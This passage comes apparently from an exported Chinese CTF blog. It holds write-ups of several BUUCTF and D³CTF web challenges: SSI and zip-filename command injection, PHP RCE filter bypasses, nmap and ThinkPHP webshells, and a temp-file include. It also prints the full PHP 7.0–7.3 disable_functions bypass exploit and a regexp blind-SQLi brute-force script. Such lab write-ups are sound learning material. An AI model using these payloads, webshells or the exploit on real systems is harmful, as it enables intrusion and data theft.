***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\n需要密码前六位md5值等于`6d0bc1`\n\n借助脚本\n\n```python\nfrom hashlib import md5\n\n\nfor i in range(10000000):\n    if md5(str(i).encode('utf-8')).hexdigest()[:6] == '6d0bc1':\n        print(i)\n```\n\n随便选一个 2020666\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683037918710-62fadfa4-b94f-45b9-bf41-9ecf8f5ebd72.png)\n\n```\n/public/6a55805e27f57db992ebd9b47735c84cb7ec8e91.shtml\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683037955243-8985022f-0080-4da4-86cd-967c1e4c6651.png)\n\n看到这里大概率是ssti 但是抓包看既不是python也不是php 所以不会了\n\n看了wp 才发现是没见过的shtml\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683038075990-bfd32873-f395-4af3-8019-feae3efe14ab.png)\n\n其实在源码中也有稍微提示\n\n 第17行`$shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");`\n\n直接用payload\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683038127194-eea19322-3722-45f8-8191-7dcc3e994406.png)\n\npayload：\n\nflag在上层目录\n\n```\n<!--#exec cmd=\"ls ../\"-->\n<!--#exec cmd=\"cat ../flag_990c66bf85a09c664f0b6741840499b2\"-->\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683039208613-241c74dc-ae63-426a-b76c-fceeb8e41dba.png)\n","tags":["ssti","shtml"],"categories":["buuctf"]},{"title":"buuctf-55-[CISCN 2019 初赛]Love Math","url":"/post/102492d1.html","content":"\n[CISCN 2019 初赛]Love Math\n\n<!--more-->\n\n这道题就是bypass 利用进制转换函数构造rce 挺不错的\n\n源码如下:\n\n```cmake\n<?php\nerror_reporting(0);\n//听说你很喜欢数学，不知道你是否爱它胜过爱flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //例子 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"太长了不会算\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"请不要输入奇奇怪怪的字符\");\n        }\n    }\n    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"请不要输入奇奇怪怪的函数\");\n        }\n    }\n    //帮你算出答案\n    eval('echo '.$content.';');\n}\n```\n\n## 解法一：\n\n利用进制转换函数\n\npayload:`c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&pi=system&cos=cat /flag`\n\n分析：\n\n`c=$pi=base_convert(37907361743,10,36)(dechex(1598506324))`这一步是构造出_GET\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033094045-2aedb2fb-1341-4c26-8fe7-a9cae55fc613.png)\n\n这里用36进制原因是包含数字字母多可以构造函数名很方便\n\n选择hex2bin这个函数是因为这个函数可以将16进制字符串转化为2进制字符串，这里可以这么理解我们常见到的字符串就是2进制的字符串（不严谨），这里面起了一个相当于将16进制转化为字符串的作用\n\n大概如图这样的作用\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033601976-34ae25d6-fd29-4fbb-a6b9-b8fb1a80feae.png)\n\n拆解：\n\n```\n$pi=_GET\n$_GET[pi]($_GET[cos])\npi=system cos=cat /flag\nsystem(cat /flag)\n```\n\n注意这里`$pi`和`pi`是两个不同的概念，一开始搞混了，至于这里为什么选择`pi`和`cos`作为参数名是因为这两个函数名占位最少，因为限制我们长度必须在80以内\n\n## 解法二\n\n利用getallheaders()函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033809691-3f418625-2ff3-430c-a2a0-10762f2fc4eb.png)\n\n返回一个数组\n\npaylaod:`?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})`\n\n相当于构造`exec(getallheaders(){1})`\n\n因为返回一个数组所以原来应该为`getallheaders()[1]`因为`[]`被屏蔽了,所以用`{}`bypass\n\n然后1为键名 所以在请求头增加一个`1: cat/flag`即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683034156126-623b55ac-0e55-40d8-a6bf-ff0e7c9e516c.png)\n","tags":["命令执行","RCE奇淫方式","bypass"],"categories":["buuctf"]},{"title":"AntCTF x D³CTF简单复现","url":"/post/e2c24be6.html","content":"\n菜鸡的自我羞辱\n\n<!--more-->\n\n# 前言\n\n有稍微看了下这个比赛，一眼就不属于我这个水平人做的，稍稍看了一道披着web皮的misc，感觉稍微有点思路，赛后看看大佬们的wp，给自己涨涨见识。\n\n# 正题\n\n## d3readfile(Misc)\n\n老套路先读读`/etc/passwd`可以读到\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954270870-621e1a29-e228-4eb2-9d64-1c21454e7eea.png)\n\n再看看环境变量\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954383884-d90e322b-4fe6-46b6-a14f-825692562e07.png)\n\n发现hint 解码发现提示\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954420464-5d98a90e-1a74-42b6-ae64-c64de031e97d.png)\n\n提示关键字是locate\n\n看了大佬的wp：locate 命令是查询文件所在位置的，会在本地缓存数据库，文件名为:locate.db,不同版本似乎缓存的目录并不一样\n\n问问chatgpt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954548792-8766f875-f44c-4f32-aafe-9e7f50cbafac.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682996671795-81e5f146-61a1-4df9-8a4c-2a24db39b17c.png)\n\n不同的linux系统位置不同\n\n- Ubuntu / Debian：/var/lib/mlocate/mlocate.db\n- CentOS / Fedora / RHEL：/var/lib/locatedb\n- Arch Linux：/var/lib/pacman/local/mlocate*/mtree\n- Gentoo: /var/cache/edb/locate.database\n- Slackware: /var/lib/slocate/slocate.db\n- FreeBSD: /var/db/locate.database\n- OpenSUSE：/var/lib/slocate/slocate.db\n- Mageia：/var/lib/mageia/mlocate.db\n- Oracle Linux：/var/cache/locate/locatedb\n\n最后发现是 \n\n```\nOracle Linux：/var/cache/locate/locatedb\n```\n\n发现flag路径：`opt/vwMDP4unF4cvqHrztduv4hpCw9H9Sdfh/UuRez4TstSQEXZpK74VoKWQc2KBubVZi/LcXAfeaD2KLrV8zBpuPdgsbVpGqLcykz/flag_1s_h3re_233`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954629044-6d77fc45-bf46-4e85-924e-9d2fe577e2ca.png)\n\nGet it!\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954670000-70aae100-4ab6-45ae-8e9f-984d320f1abc.png)\n\n## d3cloud(Web)\n\n这题看大佬WP是unzip处命令注入\n\n界面ui什么用都没有 直接进admin后台 `/admin`\n\n要登陆 `admin/admin`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683001433174-c5787435-e598-4d31-a52b-a50681371de4.png)\n\n发现一个php文件\n\n这里看wp是与官方文档相比多了点代码，那么做这道题还需要现场搭环境和代码审计qwq tql\n\n```cmake\npublic function putFileAs($path, $file, $name, $options = [])\n    {\n        $supported_file = array('gif','jpg','jpeg','png','ico','zip','mp4','mp3','mkv','avi','txt');\n        $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));\n        if (!in_array($file_type, $supported_file)) {\n            return false;\n        }\n        $stream = fopen($file->getRealPath(), 'r+');\n        $result = $this->put(\n            $path = trim($path.'/'.$name, '/'), $stream, $options\n        );\n        if (is_resource($stream)) {\n            fclose($stream);\n        }\n        if($file->getClientOriginalExtension() === \"zip\") {\n            $fs = popen(\"unzip -oq \". $this->driver->getAdapter()->getPathPrefix() . $name .\" -d \" . $this->driver->getAdapter()->getPathPrefix(),\"w\");\n            pclose($fs);\n        }\n        return $result ? $path : false;\n    }\n```\n\n是这里存在命令注入\n\n```cmake\nif($file->getClientOriginalExtension() === \"zip\") {\n            $fs = popen(\"unzip -oq \". $this->driver->getAdapter()->getPathPrefix() . $name .\" -d \" . $this->driver->getAdapter()->getPathPrefix(),\"w\");\n            pclose($fs);\n```\n\n看大佬分析unzip命令如下：\n\n```\nunzip -oq /WWW/d3cloud/storage/app/1.zip -d /WWW/d3cloud/storage/app/\n```\n\n然后利用zip文件名写shell\n\n```\n1;echo bHMgLz4gL3Zhci93d3cvaHRtbC9wdWJsaWMvbHMudHh0|base64 -\nd|bash;.zip\n```\n\n简单解释一下 将`ls /`结果重定向到`/var/www/html/public/ls.txt`文件中\n\n这里必须有换行符 不然写不进入 估计是代码审计中文件名处有转义或者别的操作 通过换行绕过\n\n还有一个疑问就是写入文件的路径是怎么获取的？是自己搭环境弄到的吗qwq\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002231725-7a1fab4c-f29d-4a0f-be37-d474d8df51bd.png)\n\n直接访问ls.txt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002436158-744f4590-d747-41ff-baa0-d4b3593bead9.png)\n\n继续和上面一样的操作\n\n```\n1;echo Y2F0IC9mbDFBZz4gL3Zhci93d3cvaHRtbC9wdWJsaWMvZmxhZy50eHQ=|base64 -\nd|bash;.zip\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002482821-010b80b2-9d7c-4f50-a51b-411008a3ac3b.png)\n\n### 小总结一下：\n\n很多难题还是需要获取到相关版本后，需要自己本地搭建去调试，才能慢慢发现漏洞\n\n代码审计能力很重要qwq\n\n\n\n# 尾巴\n\n其他的wp都看不懂 还是慢慢来吧\n\n看了一下这种真正难的ctf 大大的寄写在我脸上 \n","tags":["命令执行"],"categories":["AntCTF x D³CTF"]},{"title":"buuctf-52-[网鼎杯 2020 朱雀组]Nmap","url":"/post/c93f1585.html","content":"\n[网鼎杯 2020 朱雀组]Nmap\n\n<!--more-->\n\n看题目是一道关于nmap的题目\n\n试试127.0.0.1\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923110212-7b3277b4-e3a8-4ddc-a6d3-2029a20ecad2.png)\n\n再来试试我本地kali的nmap\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923143566-65b6630b-bc38-4280-a492-155645429f5a.png)\n\n几乎是一样的 估计就只是放了个接口\n\n nmap 命令可以将扫描结果保存在文件里面 \n\n就可以想到写一句话木马 这里屏蔽了php 并且 escapeshellarg()与escapeshellcmd()函数处理保护  与之前做的有道题目很相似\n\n可以用空格与单引号绕过\n\n选项：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923628955-36f85d37-609e-4bee-b23f-63ef33cd4b38.png)\n\n最终payload：\n\n```\n' <?= @eval($_POST[1]);?> -oG a.phtml '\n```\n\n之后rce就行了\n","tags":["nmap","esc***函数"],"categories":["buuctf"]},{"title":"buuctf-96-[GYCTF2020]EasyThinking","url":"/post/db3afe26.html","content":"\n[GYCTF2020]EasyThinking\n\n<!--more-->\n\n看标题是一个关于thinkphp的漏洞\n\n先随便乱输，发现是thinkphp6\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050340127-2a4df26d-b7ea-4d7b-8d00-1b8d918cdfa7.png)\n\n上网查一下漏洞，发现存在一个任意文件创建漏洞 （参考：https://www.anquanke.com/post/id/257485#h3-3）\n\n先注册一个账号 然后登录抓包 修改phpsessid这里\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050525889-201d9ede-14f7-40f0-838c-a802991c0e86.png)\n\n这里可以随便输入，然后会在`/runtime/session/sess_刚刚输入的32字符`生成一个文件 \n\n这里之后我们要进行命令执行，所以最好将字符串设为带有php后缀的文件\n\n然后在搜索这里上传我们的一句话木马\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050675837-fd4031ba-50f3-45b9-a53e-bc98875871ee.png)\n\n蚁剑连接 `http://7f188c29-b095-4cdc-8aad-37aa4b61403f.node4.buuoj.cn:81/runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php`\n\ngetshell之后发现读不了flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050780538-11589c45-5e9d-4046-a790-d8377818edb7.png)\n\n查看phpinfo()之后发现禁用了很多函数，做到这里和之前buu有道题目很像，有两种做法\n\n## 第一种解法 蚁剑插件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051090942-b7882cf9-e5b3-44fe-b624-0506cf666fd1.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051116541-e04d75d7-5362-4bf1-8644-0e3123f7ce13.png)\n\n## 第二种解法  上传一个绕过disable_functions的脚本  \n\nexp：7.3的版本 这里要注意php版本 不同版本对应的脚本不同\n\n```php\n<?php\n\n# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=72530\n#\n# This exploit should work on all PHP 7.0-7.3 versions\n#\n# Author: https://github.com/mm0r1\n\npwn(\"/readflag\");\n\nfunction pwn($cmd) {\n    global $abc, $helper;\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    class ryat {\n        var $ryat;\n        var $chtg;\n\n        function __destruct()\n        {\n            $this->chtg = $this->ryat;\n            $this->ryat = 1;\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if you get segfaults\n\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_repeat('A', 79);\n\n    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}';\n    $out = unserialize($poc);\n    gc_collect_cycles();\n\n    $v = [];\n    $v[0] = ptr2str(0, 79);\n    unset($v);\n    $abc = $out[2][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n\n    exit();\n}\n```\n\n将这个脚本上传上去 这里最好是到 /var/tmp  或者 /tmp 这两个路径是用户用于存储临时性的文件，亦经常被程序读写用户存储临时性数据，本质上没区别，既然是用户存储临时性数据，我们一般是有写文件权限的。 \n\n可以在我的centos7上看看\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051771351-a93986bf-01f1-43c9-a09d-e42c37133783.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051825293-1ea88dd7-710f-4876-9de0-95c867ad2022.png)\n\n可以看到这两种路径的默认权限是777\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051303740-0e86adff-6bd1-4558-a103-ad3614348457.png)\n\n上传成功 之后再去包含他\n\n成功~\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051469402-699b9232-eb82-451c-8e15-007bc3886685.png)\n","tags":["bypass","thinkphp"],"categories":["buuctf"]},{"title":"buuctf-91-[NPUCTF2020]ezinclude","url":"/post/da0771e5.html","content":"\n[NPUCTF2020]ezinclude\n\n<!--more-->\n\n一道php文件临时包含的题目，之前没见过\n\n进入之后 根据提示 给pass传一个hash值 可以抓包看到\n\n然后直接在bp里操作就行，不然网页会挑战到一个404网页\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137425602-9e43ff11-ea0a-4d35-9bc4-e4b30806e036.png)\n\n存在文件包含\n\n一般这种flag文件名称会被改写成奇奇怪怪的形式，靠猜是猜不到的\n\n读一下当前页面的源码吧 用一下伪协议\n\n构造payload：`?file=php://filter/read=convert.base64-encode/resource=flflflflag.php`\n\n发现data input zip协议都被河蟹了 没办法直接命令执行\n\n源码如下\n\n```python\n<html>\n<head>\n<script language=\"javascript\" type=\"text/javascript\">\n           window.location.href=\"404.html\";\n</script>\n<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>\n</head>\n<>\n<body>\n<?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n\tdie('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?>\n</body>\n</html>\n```\n\n扫一下网站 发现还有config.php 里面是假的flag 还有一个dir.php\n\n内容如下：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137766612-8b1fa82f-df6a-4aa0-89e5-d0945ac1bf4f.png)\n\n发现这个文件可以帮我们扫/tmp的文件目录 这个目录是存储用户临时文件的地方 我们对他有写权限 \n\n这里用到了 php临时文件包含的漏洞 具体参考（https://www.anquanke.com/post/id/201136#h2-11）\n\nphp7.0的bug：\n\n```\n?file=php://filter/string.strip_tags/resource=/etc/passwd\n```\n\n使用`php://filter/string.strip_tags`导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell,这个崩溃原因是存在一处空指针引用。\n\n该方法仅适用于以下php7版本，php5并不存在该崩溃。\n\n• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复  \n\n• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复 \n\n• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复\n\n利用大佬现成的脚本\n\n```python\nimport requests\nfrom io import BytesIO\nurl=\"http://5fd4afee-539c-424e-9b53-31cc89bbddf7.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\npayload=\"<?php phpinfo();?>\"\nfiles={\n    \"file\":BytesIO(payload.encode())\n}\nr=requests.post(url=url,files=files,allow_redirects=False)\n\n\nprint(r.text)\n```\n\n之后再去看看dir.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137989466-9f670370-e4b0-47fe-a73d-978c28304509.png)\n\n发现我们的恶意文件已经被上传\n\n再去包含一下我们的文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681138061207-03a37f3f-f1cd-4103-9530-a59e235d7fe0.png)\n","tags":["php临时文件包含"],"categories":["buuctf"]},{"title":"buuctf-90-[NCTF2019]SQLi","url":"/post/4f5e876.html","content":"\n[NCTF2019]SQLi\n\n<!--more-->\n\nsql注入 fuzz一下发现屏蔽了很多的sql常用命令\n\n扫服务器后台发现hint.txt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681030820273-63312165-e4dd-489c-8d16-4d6a50608be8.png)\n\n也就是当我们获得admin的密码时，就能获得flag，连admin都被黑名单了，显然是不想让我们通过常用的手段去注入\n\n回到主页看到他已经给了我们系统的查询语句\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681030986280-e33b949b-5625-4741-be44-78bb74245b06.png)\n\n这里是不是就能想到通过巧妙的闭合改变查询语句使得我们的恶意注入语句就能被调用\n\n看了大佬的wp发现是正则注入 regexp\n\n本地测试\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681031145077-b7064c79-5562-4128-994e-bb74b5ef25a1.png)\n\n能看出无论username的内容是否在这个表单中，因为有`||`（相当于逻辑或）\n\n当`password=\"^1\"`也就是以1开头 之后以12开头，利用这样的正则匹配去一位一位的试探，思路类似于布尔盲注，根据回显来判断。\n\n回到题目，应该怎么构造呢\n\n题目sql里的查询语句为：\n\n```\nselect * from users where username='' and passwd=''\n```\n\n可以构造`username=\\&passwd=||sql;%00`  空格被河蟹了可以用`/**/`绕过  注释符`# --`\n\n`%00`来绕过本质上是截断 这里末尾的封号实际上是sql语句里的\n\n因为很多程序底层都是c语言编译的，c语言对于一个字符串到末尾的标识是是否检测到`\\0`经过url加密后即为`%00`\n\n放入原语句后为：`select * from users where username='\\' and passwd='||sql;%00'`\n\n相当于username中的语句为`' and passwd =`内容不重要 然后逻辑或 加上我们的sql注入的恶意语句\n\n```\nusername=\\&passwd=||/**/passwd/**/regexp/**/\"^{}\";%00\n```\n\n如果回显正常为会定向到welcome.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681033291490-4106c873-7f0f-4dc4-930a-176e216861db.png)\n\n根据思路写出脚本\n\n```python\nimport requests\nfrom urllib import parse\nimport string\nurl = 'http://16b0c2ee-be28-47f4-8454-b6a04a23aa8f.node4.buuoj.cn:81/index.php'\nresult = ''\ndictionary = string.ascii_lowercase + string.digits + '_' #爆破字典\nfor i in range (1,35):\n    for j in dictionary:\n        payload = {\n            \"username\":\"\\\\\",   #这里需要转义一下\n            \"passwd\":\"||/**/passwd/**/regexp/**/\\\"^{}\\\";{}\".format((result+j),parse.unquote(\"%00\"))\n        }\n        r = requests.post(url,data=payload)\n        if \"welcome\" in r.text:\n            result+=j\n            break\n    print(result)\n```\n\n这里注意一下：如果在登录框里面敲%00 那样会导致%00被转义而失去作用 在python脚本里面 我们用parse.unquote('%00')表示不进行转义的%00 这样就能爆出密码  \n","tags":["sql注入","sql bypass","sql正则注入"],"categories":["buuctf"]},{"title":"buuctf-88-[网鼎杯 2018]Comment","url":"/post/3a0e9ae9.html","content":"\n[网鼎杯 2018]Comment\n\n<!--more-->\n\n这是一道关于sql二次注入的题目 第一次遇到二次注入的题目蛮不错\n\n进入之后，是一个类似于留言板的界面\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456616603-81a091fd-c756-4579-9d71-8352ed648e24.png)\n\n需要先登录 然后形式是密码最后三位纯数字不知道 通过bp爆破一下就出来了 密码结尾是666\n\n进入之后f12\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456702395-d52c4662-22f7-4655-af63-fa9d6fc43792.png)\n\n发现提示 存在git源码泄露的\n\n直接上githack\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456816678-f2f3e1ca-7c33-420e-ba91-40677e6f3b1c.png)\n\n发现源码\n\n```plain\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    break;\ncase 'comment':\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\n但是发现源码不全 \n\n用`git log`或者 `git log --reflog`找到原来的代码然后恢复\n\n但是我这里没有复现成功 一直报错 找了好久没发现是什么原因\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457000040-68cd4018-9ec3-40a8-b762-b9cc760e35b5.png)\n\n无果只能再去寻找别的方法\n\n然后发现了另一个 提取远程 git 泄露或本地 git 的工具   git_extract  可以说是增强版 \n\n源码地址：https://github.com/gakki429/Git_Extract\n\n调用的时候 要用python2 因为这是python2的脚本\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457176398-212a1e06-efb1-4962-a7ca-4eeb2f93d696.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457212657-afd10c8f-9d96-48ce-8e53-9ce1e4516f90.png)\n\n发现了更早的源码\n\n```plain\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    $category = addslashes($_POST['category']);\n    $title = addslashes($_POST['title']);\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into board\n            set category = '$category',\n                title = '$title',\n                content = '$content'\";\n    $result = 